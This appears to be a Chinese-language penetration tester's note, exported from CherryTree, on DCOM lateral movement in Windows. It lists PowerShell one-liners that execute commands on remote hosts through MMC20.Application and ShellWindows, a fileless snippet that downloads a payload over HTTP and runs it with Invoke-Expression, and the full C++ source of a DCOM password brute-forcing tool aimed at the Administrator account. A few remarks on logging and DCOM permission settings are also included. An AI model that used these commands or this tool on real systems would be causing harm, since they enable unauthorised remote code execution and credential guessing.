<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>DCOM</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>DCOM</h1><br/><br />条件：<br />1、已经拿到一台机器的administrator权限<br />2、目标机器和本机的账号密码一致<br />3、目标机器开启135端口，关闭防火墙<br />4、不需要其他配置，DCOM默认为administrator组分配足够的权限<br /><br />原理：<br />1、使用DCOM，远程唤醒mmc.exe进程或利用资源管理器，输入指定参数运行<br />2、PowerShell调用的是RemoteGetClassObject接口进行端口协商和进程创建<br /><br />步骤：<br />1、攻击者运行powershell<br />2、输入下列任意一条<br /><br />[Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.61.12&quot;)).item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;,&quot;c://windows/system32&quot;,$null,0)<br /><br />这条可以利用SMB进行横向传播<br /><br /><br />[Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#39;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#39;,&quot;172.20.10.251&quot;)).Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;,&quot;c://windows/system32&quot;,$null,0)<br /><br />[Activator]::CreateInstance([Type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.61.1&quot;)).Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;/c calc.exe&quot;,&quot;Minimized&quot;)<br /><br /><br />$([activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;,&quot;172.20.10.251&quot;))).Navigate(&quot;c:\windows\system32\calc.exe&quot;)<br /> <br />$([activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;,&quot;172.20.10.251&quot;))).Navigate2(&quot;c:\windows\system32\calc.exe&quot;)<br /><br />$([System.Activator]::CreateInstance([Type]::GetTypeFromCLSID(&quot;9BA05972-F6A8-11CF-A442-00A0C90A8F39&quot;,&quot;172.20.10.251&quot;))).Navigate(&quot;c:\windows\system32\calc.exe&quot;)<br />    <br />$([System.Activator]::CreateInstance([Type]::GetTypeFromCLSID(&quot;9BA05972-F6A8-11CF-A442-00A0C90A8F39&quot;,&quot;172.20.10.251&quot;))).Navigate2(&quot;c:\windows\system32\calc.exe&quot;)<br />4、报错80070005是账号密码不对或权限不够，800706ba是被防火墙拦截<br />5、其他报错情况不了解<br />6、登陆成功在事件查看器中可以看到共4条登陆记录，登陆失败无日志，还有4634的注销记录<br /><a href=""><img src="images\537-1.png" alt="images\537-1.png" /></a><br /><br /><br /><br /><br />其他Word、Excel、PPT、Outlook、Visio等<br /><a href="https://www.cybereason.com/blog/dcom-lateral-movement-techniques">https://www.cybereason.com/blog/dcom-lateral-movement-techniques</a><br />其他组件自己查询利用方式<br /><a href="https://www.4hou.com/technology/18659.html">https://www.4hou.com/technology/18659.html</a><br /><br /><br />$outlook = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Outlook.Application&quot;))<br />$shell = $outlook.CreateObject(&quot;Shell.Application&quot;)<br />$shell.ShellExecute(&quot;calc.exe&quot;)<br /><br /><br />无文件下载和执行<br />$o = [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;F5078F35-C551-11D3-89B9-0000F81FE221&quot;)); <br />$o.Open(&quot;GET&quot;, &quot;<a href="http://127.0.0.1/payload",">http://127.0.0.1/payload&quot;,</a> $False); <br />$o.Send(); <br />Invoke-Expression $o.responseText;<br /><br /><br /><br />不知道密码的时候还可以进行RPC爆破，对administrator进行爆破<br /><br /><table style="display:inline-table"><tr><td><a href="EmbeddedFiles\537-dcomBreak.exe">Linked file: dcomBreak.exe </a></td></tr></table><br /><br /><div class="codebox"><div class="codebox">//&nbsp;dcomBreak.cpp&nbsp;:&nbsp;定义控制台应用程序的入口点。<br />//<br /><br />#include&nbsp;&quot;stdafx.h&quot;<br />#include&lt;string&gt;<br />#include&nbsp;&lt;initguid.h&gt;<br />#include&nbsp;&lt;objbase.h&gt;<br />#include&lt;getopt.h&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />#include&nbsp;&lt;iostream&gt;<br />#include&nbsp;&lt;fstream&gt;<br />#include&nbsp;&lt;cassert&gt;<br />#include&nbsp;&quot;atlconv.h&quot;<br /><br />using&nbsp;namespace&nbsp;std;<br /><br />DEFINE_GUID(CLSID_SimpleObject,&nbsp;0x9BA05972,&nbsp;0xF6A8,&nbsp;0x11cf,&nbsp;0xA4,&nbsp;0x42&nbsp;,&nbsp;0x00,&nbsp;0xA0,&nbsp;0xC9,&nbsp;0x0A,&nbsp;0x8F,&nbsp;0x39);<br />int&nbsp;main(int&nbsp;argc,&nbsp;char&nbsp;*argv[])<br />{<br />	char*&nbsp;pszName&nbsp;=&nbsp;nullptr;<br />	char*&nbsp;filename&nbsp;=&nbsp;nullptr;<br />	char*&nbsp;ip&nbsp;=&nbsp;nullptr;<br />	wchar_t&nbsp;wip[20];<br />	int&nbsp;sum&nbsp;=&nbsp;0;<br />	int&nbsp;g&nbsp;=&nbsp;0;<br /><br />	int&nbsp;opt;&nbsp;&nbsp;//&nbsp;getopt()&nbsp;的返回值<br />	char&nbsp;*optstring&nbsp;=&nbsp;&quot;u:p:i:gc&quot;;&nbsp;//&nbsp;设置短参数类型及是否需要参数<br />	if(argc&lt;2)printf(&quot;Usage:\n-u:username\n-p:password&nbsp;file\n-i:target&nbsp;ip\n-g&nbsp;means:RemoteGetClassObject\n-c&nbsp;means:RemoteCreateInstance(default)\n\nFor&nbsp;example:\n%s&nbsp;-u&nbsp;Administrator&nbsp;-p&nbsp;password.txt&nbsp;-i&nbsp;192.168.1.1\n&quot;,argv[0]);<br />	while&nbsp;((opt&nbsp;=&nbsp;getopt(argc,&nbsp;argv,&nbsp;optstring))&nbsp;!=&nbsp;-1)&nbsp;{<br />		if&nbsp;(opt&nbsp;==&nbsp;&#39;u&#39;)<br />			pszName&nbsp;=&nbsp;optarg;<br />		if&nbsp;(opt&nbsp;==&nbsp;&#39;p&#39;)<br />			filename&nbsp;=&nbsp;optarg;<br />		if&nbsp;(opt&nbsp;==&nbsp;&#39;i&#39;)&nbsp;<br />			ip&nbsp;=&nbsp;optarg;<br />		if&nbsp;(opt&nbsp;==&nbsp;&#39;g&#39;)<br />			g&nbsp;=&nbsp;1;<br />		if&nbsp;(opt&nbsp;==&nbsp;&#39;c&#39;)<br />			g&nbsp;=&nbsp;0;<br />	}<br /><br /><br />	if&nbsp;(filename&nbsp;==&nbsp;nullptr&nbsp;||&nbsp;pszName==nullptr&nbsp;||&nbsp;ip==nullptr)return&nbsp;-1;<br /><br />	mbstowcs(wip,&nbsp;ip,&nbsp;strlen(ip)&nbsp;+&nbsp;1);<br /><br />	printf(&quot;name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:%s\n&quot;,&nbsp;pszName);<br />	printf(&quot;passwordFile:%s\n&quot;,&nbsp;filename);<br />	wprintf(L&quot;targetIP&nbsp;&nbsp;&nbsp;&nbsp;:%s\n&quot;,&nbsp;wip);<br />	if&nbsp;(g)&nbsp;{<br />		printf(&quot;function&nbsp;&nbsp;&nbsp;&nbsp;:RemoteGetClassObject\n\n&quot;);<br />	}<br />	else&nbsp;{<br />		printf(&quot;function&nbsp;&nbsp;&nbsp;&nbsp;:RemoteCreateInstance\n\n&quot;);<br />	}<br /><br />	ifstream&nbsp;infile;<br />	infile.open(filename);&nbsp;&nbsp;&nbsp;//将文件流对象与文件连接起来&nbsp;<br />	assert(infile.is_open());&nbsp;&nbsp;&nbsp;//若失败,则输出错误消息,并终止程序运行&nbsp;<br />	<br />	string&nbsp;s;<br />	printf(&quot;password,response\n&quot;);<br />	while&nbsp;(getline(infile,&nbsp;s))&nbsp;{<br />		CoInitialize(NULL);//初始化COM环境<br />		char*&nbsp;pszDomain&nbsp;=&nbsp;new&nbsp;char[255];<br />		char*&nbsp;pszPassword&nbsp;=&nbsp;&amp;s[0];<br />		pszDomain&nbsp;=&nbsp;&quot;&quot;;<br /><br /><br />		COAUTHIDENTITY&nbsp;author_id;			//身份信息<br />		ZeroMemory(&amp;author_id,&nbsp;sizeof(COAUTHIDENTITY));<br />		author_id.Flags&nbsp;=&nbsp;SEC_WINNT_AUTH_IDENTITY_ANSI;<br />		/*<br />		SEC_WINNT_AUTH_IDENTITY_ANSI<br />		SEC_WINNT_AUTH_IDENTITY_UNICODE<br />		*/<br />		author_id.User&nbsp;=&nbsp;reinterpret_cast&lt;USHORT*&gt;(pszName);<br />		author_id.UserLength&nbsp;=&nbsp;strlen(pszName);<br />		author_id.Domain&nbsp;=&nbsp;reinterpret_cast&lt;USHORT*&gt;(pszDomain);<br />		author_id.DomainLength&nbsp;=&nbsp;strlen(pszDomain);<br />		author_id.Password&nbsp;=&nbsp;reinterpret_cast&lt;USHORT*&gt;(pszPassword);<br />		author_id.PasswordLength&nbsp;=&nbsp;strlen(pszPassword);<br /><br />		COAUTHINFO&nbsp;athn;					//连接方式<br />		ZeroMemory(&amp;athn,&nbsp;sizeof(COAUTHINFO));<br />		athn.dwAuthnLevel&nbsp;=&nbsp;RPC_C_AUTHN_LEVEL_CONNECT;<br />		/*<br />		RPC_C_AUTHN_LEVEL_DEFAULT&nbsp;			使用指定身份验证服务的默认身份验证级别。<br />		RPC_C_AUTHN_LEVEL_NONE&nbsp;				不执行身份验证。<br />		RPC_C_AUTHN_LEVEL_CONNECT&nbsp;			仅在客户端与服务器建立关系时进行身份验证。&nbsp;&nbsp;默认是这个<br />		RPC_C_AUTHN_LEVEL_CALL&nbsp;				仅在服务器收到请求时在每个远程过程调用开始时进行身份验证。不适用于使用基于连接的协议序列（以前缀“ncacn”开头的那些）进行的远程过程调用。如果绑定句柄中的协议序列是基于连接的协议序列，并且您指定了此级别，则此例程将使用RPC_C_AUTHN_LEVEL_PKT常量。<br />		RPC_C_AUTHN_LEVEL_PKT&nbsp;				仅验证收到的所有数据来自预期的客户端。不验证数据本身。<br />		RPC_C_AUTHN_LEVEL_PKT_INTEGRITY&nbsp;	验证并验证客户端和服务器之间传输的数据均未被修改。<br />		RPC_C_AUTHN_LEVEL_PKT_PRIVACY&nbsp;		包括所有以前的级别，并确保发送方和接收方只能看到明文数据。在本地案例中，这涉及使用安全通道。在远程情况下，这涉及加密每个远程过程调用的参数值。<br />		参考：https://docs.microsoft.com/en-us/windows/win32/rpc/authentication-level-constants<br />		*/<br /><br />		athn.dwAuthnSvc&nbsp;=&nbsp;RPC_C_AUTHN_WINNT;<br />		/*<br />		RPC_C_AUTHN_NONE				没有身份验证<br />		RPC_C_AUTHN_DCE_PRIVATE			使用分布式计算环境（DCE）私钥身份验证。<br />		RPC_C_AUTHN_DCE_PUBLIC			DCE公钥认证（保留供将来使用）。<br />		RPC_C_AUTHN_DEC_PUBLIC			DEC公钥认证（保留供将来使用）。<br />		RPC_C_AUTHN_GSS_NEGOTIATE		使用Microsoft&nbsp;Negotiate&nbsp;SSP。此SSP在使用NTLM和Kerberos协议安全支持提供程序（SSP）之间进行协商。<br />		RPC_C_AUTHN_WINNT				使用Microsoft&nbsp;NT&nbsp;LAN&nbsp;Manager（NTLM）SSP。<br />		RPC_C_AUTHN_GSS_SCHANNEL		使用Schannel&nbsp;SSP。该SSP支持安全套接字层（SSL），专用通信技术（PCT）和传输级安全性（TLS）。<br />		RPC_C_AUTHN_GSS_KERBEROS		使用Microsoft&nbsp;Kerberos&nbsp;SSP。<br />		RPC_C_AUTHN_DPA					使用分布式密码验证（DPA）。<br />		RPC_C_AUTHN_MSN					用于Microsoft网络（MSN）的身份验证协议SSP。<br />		RPC_C_AUTHN_DIGEST				Windows&nbsp;XP或更高版本：使用Microsoft摘要SSP			<br />		RPC_C_AUTHN_NEGO_EXTENDER		Windows&nbsp;7或更高版本：保留。不使用<br />		RPC_C_AUTHN_MQ					此SSP为Microsoft消息队列（MSMQ）传输级协议提供SSPI兼容的包装器。<br />		RPC_C_AUTHN_DEFAULT				使用默认身份验证服务。<br />		*/<br />		athn.dwAuthzSvc&nbsp;=&nbsp;RPC_C_AUTHZ_NONE;<br />		/*<br />		RPC_C_AUTHZ_NONE			服务器不执行授权。	大多数应用程序发现RPC_C_AUTHZ_NON已足够<br />		RPC_C_AUTHZ_NAME			服务器根据客户端的主体名称执行授权。<br />		RPC_C_AUTHZ_DCE				服务器使用客户端的DCE权限属性证书（PAC）信息执行授权检查，该信息通过使用绑定句柄进行的每个远程过程调用发送到服务器。通常，根据DCE访问控制列表（ACL）检查访问。<br />		RPC_C_AUTHZ_DEFAULT			服务器使用当前SSP的默认授权服务。<br />		*/<br />		athn.dwCapabilities&nbsp;=&nbsp;EOAC_NONE;<br />		athn.dwImpersonationLevel&nbsp;=&nbsp;RPC_C_IMP_LEVEL_IMPERSONATE;<br />		/*<br />		RPC_C_IMP_LEVEL_DEFAULT					DCOM可以使用其常规安全毯协商算法来选择模拟级别。有关更多信息，请参阅安全毯协商。<br />		RPC_C_IMP_LEVEL_ANONYMOUS	匿名		客户端对服务器是匿名的。服务器进程可以模拟客户端，但模拟令牌不包含任何信息且无法使用。<br />		RPC_C_IMP_LEVEL_IDENTIFY	标识		服务器可以获取客户端的身份。服务器可以模拟客户端进行ACL检查，但不能作为客户端访问系统对象。<br />		RPC_C_IMP_LEVEL_IMPERSONATE	模拟		服务器进程可以在代表客户端执行时模拟客户端的安全上下文。此模拟级别可用于访问本地资源（如文件）。在此级别进行模拟时，模拟令牌只能通过一个机器边界传递。该Schannel中的身份验证服务只支持该级别的模拟的。<br />		RPC_C_IMP_LEVEL_DELEGATE	委派		服务器进程可以在代表客户端执行时模拟客户端的安全上下文。服务器进程还可以使用隐藏真实内容代表客户端执行向其他服务器的传出呼叫。服务器可以使用其他计算机上的客户端安全上下文来访问作为客户端的本地和远程资源。在此级别进行模拟时，模拟令牌可以通过任意数量的计算机边界传递。<br />		<br />		*/<br /><br />		athn.pAuthIdentityData&nbsp;=&nbsp;&amp;author_id;<br />		athn.pwszServerPrincName&nbsp;=&nbsp;NULL;<br /><br />		COSERVERINFO&nbsp;ServerInfo;			//创建服务器信息结构<br />		ZeroMemory(&amp;ServerInfo,&nbsp;sizeof(COSERVERINFO));<br />		ServerInfo.pwszName&nbsp;=&nbsp;wip;<br />		ServerInfo.pAuthInfo&nbsp;=&nbsp;&amp;athn;<br />		ServerInfo.dwReserved1&nbsp;=&nbsp;0;<br />		ServerInfo.dwReserved2&nbsp;=&nbsp;0;<br /><br />		MULTI_QI&nbsp;MultiQI;<br />		MultiQI.hr&nbsp;=&nbsp;NOERROR;<br />		MultiQI.pItf&nbsp;=&nbsp;NULL;<br />		MultiQI.pIID&nbsp;=&nbsp;&amp;IID_IStream;<br /><br />		IClassFactory&nbsp;*t_ClassFactory&nbsp;=&nbsp;NULL;<br />		<br />		HRESULT&nbsp;hr;<br />		if&nbsp;(g)&nbsp;{<br />			hr&nbsp;=&nbsp;CoGetClassObject(<br />				CLSID_SimpleObject,<br />				CLSCTX_REMOTE_SERVER,<br />				&amp;ServerInfo,<br />				IID_IClassFactory,<br />				(void&nbsp;**)&amp;&nbsp;t_ClassFactory<br />			);<br />		}<br />		else&nbsp;{<br />			hr&nbsp;=&nbsp;CoCreateInstanceEx(CLSID_SimpleObject,<br />				NULL,<br />				CLSCTX_REMOTE_SERVER,<br />				&amp;ServerInfo,<br />				1,<br />				&amp;MultiQI);<br />		}<br />		<br />		if&nbsp;(hr&nbsp;==&nbsp;0x80070005&nbsp;||&nbsp;hr&nbsp;==&nbsp;0x800706BA)&nbsp;{<br />			printf(&quot;%s,%p&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r&quot;,&nbsp;pszPassword,&nbsp;hr);<br />		}<br />		else&nbsp;{<br />			printf(&quot;%s,%p&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\n&quot;,&nbsp;pszPassword,&nbsp;hr);<br />		}<br />		CoUninitialize();<br />		sum&nbsp;+=&nbsp;1;<br /><br />	}<br /><br /><br />	printf(&quot;\n爆破完成，共尝试%d个密码\n&quot;,&nbsp;sum);<br />	infile.close();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;<br />}<br /><br /></div></div><br /><br />DCOM配置的一些解释：<br />self                             （当前活动的账户）<br />network                        (从ip访问的用户，需验证)<br />everyone                       (每个用户除了GUESTS，需验证)<br />Authenticated Users      (验证过的账号)<br />anonymous logon         任何没有使用标志符登录的用户   没用<br />Interactive 	（人机交互的）比如本地登录和远程桌面登录		<br />Network                      远程访问这个机器的用户，除了人机对话的桌面访问（例如，文件共享或者RPC调用）<br /><br /><br />内置的SDDL SID对应的帐户：<a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/sid-strings">https://docs.microsoft.com/zh-cn/windows/win32/secauthz/sid-strings</a><br />权限对应：<a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/ace-strings?redirectedfrom=MSDN">https://docs.microsoft.com/zh-cn/windows/win32/secauthz/ace-strings?redirectedfrom=MSDN</a><br /><br />对应的注册表:<br />计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Ole<br />计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc<br /><br />组策略部分的注册表：<br />计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\DCOM<br /><br />COM组件注册：<br />计算机\HKEY_CLASSES_ROOT\CLSID<br />自定义权限：<br />计算机\HKEY_CLASSES_ROOT\AppID<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>